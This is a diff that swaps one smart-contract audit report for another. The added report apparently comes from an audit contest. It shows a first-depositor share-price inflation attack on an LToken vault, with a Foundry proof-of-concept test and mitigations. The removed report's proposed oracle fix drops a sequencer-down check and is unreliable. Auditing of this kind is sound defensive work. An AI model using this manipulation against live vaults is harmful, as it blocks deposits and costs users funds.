@@ -1,117 +1,53 @@
-ladboy233
-# The chainlink oracle data to determine the collateral worth may be outdated because a invalid timestamp is used to check if the oracle data is up-to-date. 
+JohnSmith
+# First user can set arbitrary price, which may prevent some users to deposit
 
-## Summary
+## [M] First user can set arbitrary price, which may prevent some users to deposit
+### Problem
+First user can set share price by sending tokens to the system externally, price can be very high. As result a lot of users will not be able to deposit.
+And borrowers will have smaller amount to borrow and higher interest rate to pay, because amount of underlying asset is smaller, because less amount of people are able to deposit.
 
-The chainlink oracle data to determine the collateral worth may be outdated because a invalid timestamp is used to check if the oracle data is up-to-date in ArbiChainlinkOracle.sol.
+### Proof of Concept
+```solidity
+pragma solidity 0.8.15;
 
+import {TestBase} from "../utils/TestBase.sol";
+import "forge-std/console.sol";
 
-## Vulnerability Detail
+contract ProtocolTest is TestBase {
+    address public alice = cheats.addr(1);
+    address public bob = cheats.addr(2);
 
-in ArbiChainlinkOracle.sol
+    function setUp() public {
+        setupContracts();
+    }
 
-the function getPrice is implemented to make sure we get the underlying token worth when calculating how much the collateral is worth.
+    function testSharePriceManipulation() public{
+        erc20.mint(address(alice), 1000 ether);
+        erc20.mint(address(bob), 1000 ether);
+        cheats.prank(alice);
+        erc20.approve(address(lErc20), type(uint256).max);
+        cheats.prank(bob);
+        erc20.approve(address(lErc20), type(uint256).max);
 
-```
-    /// @inheritdoc ChainlinkOracle
-    function getPrice(address token) external view override returns (uint) {
-        if (!isSequencerActive()) revert Errors.L2SequencerUnavailable();
+        cheats.startPrank(alice);
+        lErc20.deposit(1, alice); // 1 share costs 1 wei now
+        assertEq(lErc20.previewRedeem(1), 1);
 
-        (, int answer,,,) =
-            feed[token].latestRoundData();
+        erc20.transfer(address(lErc20), 100 ether); // 1 share costs 100 ether + 1 wei now
+        cheats.stopPrank();
 
-        if (answer < 0)
-            revert Errors.NegativePrice(token, address(feed[token]));
+        assertEq(lErc20.previewDeposit(80 ether), 0);
+        assertEq(lErc20.previewDeposit(100 ether + 1), 1);
 
-        return (
-            (uint(answer)*1e18)/getEthPrice()
-        );
+        //bob cannot deposit below share price which can be very expensive
+        cheats.expectRevert("ZERO_SHARES");
+        cheats.prank(bob);
+        lErc20.deposit(80 ether, bob);
     }
 ```
 
-note we check if the oracle data is up-to-date in the
+### Mitigation
+Force users to deposit at least some amount in the LToken vault .
+That way the amount the attacker will need to ERC20.transfer to the system will be at least X * 1e18 instead of X which is unrealistic.
+An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2
 
-```
-    function isSequencerActive() internal view returns (bool) {
-        (, int256 answer, uint256 startedAt,,) = sequencer.latestRoundData();
-        if (block.timestamp - startedAt <= GRACE_PERIOD_TIME || answer == 1)
-            return false;
-        return true;
-    }
-```
-
-according to the chainlink oracle documentation
-
-https://docs.chain.link/docs/price-feeds-api-reference/#latestrounddata
-
-the lastestRoundData returns
-
-```
-roundId: The round ID.
-answer: The price.
-startedAt: Timestamp of when the round started.
-updatedAt: Timestamp of when the round was updated.
-answeredInRound: The round ID of the round in which the answer was computed.
-```
-
-the current implementation use the startedAt timestamp instead of updatedAt to check if the oracle is valid.
-
-In this case when the oracle data is lagging, it is possible that we have the huge time difference between the startedAt and updatedAt timestamp.
-
-Also, the grace period is 1 hour. which is very long because the crypto market prices can change drastically in a volatile period.  So the oracle data from an hour ago may not reflect the current market price.
-
-```
-    /// @notice L2 Sequencer grace period
-    uint256 private constant GRACE_PERIOD_TIME = 3600;
-```
-
-
-## Impact
-
-```
-  if (block.timestamp - startedAt <= GRACE_PERIOD_TIME || answer == 1)
-            return false;
-```
-
-
-If the oracle is lagging, the logic above is not capable to invalidating outdated oracle data because the use of startedAt and a long grace period. then the function _valueIn can get the invalid or lagging oracle and determine the wrong number of debt or callateral worth. User may not able to deposit or repay to manage their position or malicious liquidators can liquidated user's account balance.
-
-```
-    function _valueInWei(address token, uint amt)
-        internal
-        view
-        returns (uint)
-    {
-        return oracle.getPrice(token)
-        .mulDivDown(
-            amt,
-            10 ** ((token == address(0)) ? 18 : IERC20(token).decimals())
-        );
-    }
-```
-
-## Tool used
-
-Manual Review
-
-Yes
-
-## Recommendation
-
-We recomment the project to use updatedAt timestamp and shorten the grace period to make sure the oracle data is up to date. 
-
-Fix:
-
-```
-    /// @notice L2 Sequencer grace period
-    uint256 private constant GRACE_PERIOD_TIME = 500;
-```
-
-```
-    function isSequencerActive() internal view returns (bool) {
-        (, int256 answer,, updatedAt,) = sequencer.latestRoundData();
-        if (block.timestamp - updatedAt <= GRACE_PERIOD_TIME)
-            return false;
-        return true;
-    }
-```
